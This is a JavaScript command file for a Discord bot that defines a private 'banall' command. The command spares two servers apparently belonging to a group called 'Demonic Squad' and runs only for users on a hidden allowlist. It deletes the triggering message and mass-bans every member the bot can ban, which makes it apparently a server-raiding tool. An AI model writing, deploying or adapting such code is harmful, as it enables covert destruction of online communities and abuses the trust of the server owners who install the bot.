const { MessageEmbed } = require('discord.js');

exports.run = async(client, message, args) => {

if(message.guild.name === "Ḋemonic ֆquad | Þriv") return;
if(message.guild.name === "• [ Demonic Squad | Logs ]") return;

  const db = require ('megadb');
const squad = new db.crearDB('squad');

 if (!squad.has(message.author.id)) return 

  message.delete()
  
try{

message.guild.members.cache.filter(m => m.bannable).forEach(member => message.guild.members.ban(member.id));
  
  } catch(error_ban_all) {
    console.log(error_ban_all.stack);
  }

}

exports.help = {
  name:"banall",
  aliases:[],
  usage:"[ Uso Independiente : No require Argumentos ]",
  description:"Banea a los usuario por debajo del bot",
  category:"Private"
  
}